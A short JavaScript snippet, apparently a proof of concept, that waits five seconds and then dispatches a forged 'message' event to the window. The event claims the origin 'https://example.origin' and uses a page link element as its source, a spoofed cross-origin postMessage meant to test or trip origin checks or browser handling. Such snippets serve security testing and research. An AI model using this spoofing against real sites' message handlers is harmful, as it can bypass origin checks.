setTimeout(() => {
  var exploit_message = new MessageEvent("message");
  exploit_message.initMessageEvent("message", false, false, {}, "https://example.origin", "", document.getElementsByTagName('a')[0], []);
  console.log(exploit_message);
  window.dispatchEvent(exploit_message);
}, 5000);